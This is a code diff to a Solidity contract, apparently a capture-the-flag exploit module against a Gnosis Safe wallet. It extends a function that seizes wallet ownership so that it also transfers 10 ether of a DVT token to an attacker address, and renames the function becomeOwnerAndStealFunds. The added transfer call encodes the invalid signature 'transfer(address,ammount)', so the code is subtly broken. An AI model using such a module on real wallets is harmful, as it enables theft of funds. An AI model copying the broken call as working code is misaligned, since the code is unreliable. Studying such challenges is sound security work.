@@ -18,9 +18,11 @@ contract ControllerModule is ModuleManager {
     GnosisSafe internal proxy;
 
     address private _attacker;
+    address private _dvt;
 
-    constructor(address attacker) {
+    constructor(address attacker, address dvt) {
         _attacker = attacker;
+        _dvt = dvt;
     }
 
     function setup(address payable proxy_) public {
@@ -41,7 +43,7 @@ contract ControllerModule is ModuleManager {
     }
 
     // Allows anyone to become the wallet's owner
-    function becomeOwner() external {
+    function becomeOwnerAndStealFunds() external {
         address walletOwner = GnosisSafe(proxy).getOwners()[0];
         executeCall(
             address(proxy),
@@ -51,6 +53,16 @@ contract ControllerModule is ModuleManager {
                 address(0x1),
                 walletOwner,
                 address(this)
+            )
+        );
+
+        executeCall(
+            address(_dvt),
+            0,
+            abi.encodeWithSignature(
+                "transfer(address,ammount)",
+                _attacker,
+                10 ether
             )
         );
     }
